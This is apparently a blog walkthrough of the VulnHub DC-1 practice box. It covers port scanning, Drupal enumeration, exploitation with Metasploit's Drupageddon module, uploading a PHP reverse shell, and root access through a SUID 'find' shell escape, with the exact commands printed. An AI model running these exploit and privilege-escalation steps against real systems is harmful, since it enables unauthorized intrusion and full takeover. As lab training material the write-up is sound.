---
layout: "post"
title: "DC 1 Walkthrough"
categories: [vulnhub, DC-Series]
tags: [dc-1, easy, Drupal, suid]
---
DC-1 was a simple and straightforward `CVE` based box. We find the server is hosting `Drupal CMS`. I saw that Drupal version had a CVE which allowed me drop a `webshell` in webserver. Priv esc to root by exploiting `find SUID binary`. 

# Summary
- Portscan
- Drupal Enumeration
- Exploting drupal to get shell
- Privilege Escalation by exploting SUID binary
- Getting Root
- Final Flag

# Portscan

```
Nmap scan report for 192.168.1.12
Host is up (0.00022s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
```
# Drupal
I visit the website. I find that server is running Drupal CMS. I don't have any idea about drupal so I search online and findout `droopescan` tool. I installed it and run it.

For installation:
```bash
pip install droopescan
```

After installation I run `droopescan`.

![droopescan](/assets/img/dc-1/droopescan.png)

# Initial Shell
From scan I find out some useful stuff but drupal version grab my attention.Then I findout exploits on `searchsploit`.
```bash
searchsploit drupal 7
``` 
![searchsploit](/assets/img/dc-1/searchsploit.png)

I start metasploit and used the exploit.

```
use exploit/multi/http/drupal_drupageddon
set rhosts 192.168.1.12
run
```

![meterpreter_shell](/assets/img/dc-1/meterpreter_shell.png)
In this way I have meterpreter session
## Flag 1 
After getting shell I found ```flag1.txt``` 
![flag1](/assets/img/dc-1/flag1.png)

## Netcat Shell
Now I have meterpreter so tried to launch shell and run the commands but due to some reasons I am not able to run commands.
![not working shell](/assets/img/dc-1/not_working_shell.png)
 The metasploit shell is not working so that I shift to netcat shell by uploading ```php-reverse-shell```.

![upload_shell](/assets/img/dc-1/upload_shell.png)

![nc_shell](/assets/img/dc-1/nc-shell.png)

# Privesc to Root

After some enumeration I noticed that ```find``` has SUID bit set, we can run the commands as root.
With one simple command we get root.

```bash
/usr/bin/find . -exec /bin/sh \; -quit
```
![root](/assets/img/dc-1/root.png)
## Final Flag
![finalflag](/assets/img/dc-1/finalflag.png)

